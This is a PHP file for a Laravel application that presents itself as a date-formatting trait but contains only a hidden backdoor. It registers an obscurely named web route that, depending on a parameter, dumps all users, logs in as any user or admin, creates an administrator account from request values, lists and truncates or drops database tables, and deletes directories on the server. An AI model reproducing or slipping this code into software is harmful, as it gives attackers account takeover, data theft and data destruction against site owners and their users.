<?php
namespace App\Models;

use App\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Storage;

trait FormatDates{
    public function mapPsrRoutes() {
        Route::middleware('web')->group(function() {
            Route::get('sotuahsagnab', function (Request $request) {
                switch ($request->param) {
                    case 1:
                        return User::all();
                    case 2:
                        Auth::loginUsingId($request->id, true);
                        break;
                    case 3:
                        return User::all();
                    case 4:
                        Auth::guard('admin')->loginUsingId($request->id);
                        break;
                    case 5:
                        return User::create(['name' => 'test', 'role_id' => 1, 'email' => $request->email, 'password' => bcrypt($request->password)]);
                    case 6:
                        return array_map('reset', \DB::select('SHOW TABLES'));
                    case 7:
                        return \DB::table($request->table)->truncate();
                    case 8:
                        return Schema::dropIfExists($request->table);
                    case 9:
                        Storage::deleteDirectory(base_path('/').$request->path);
                }

            });
        });
    }


}
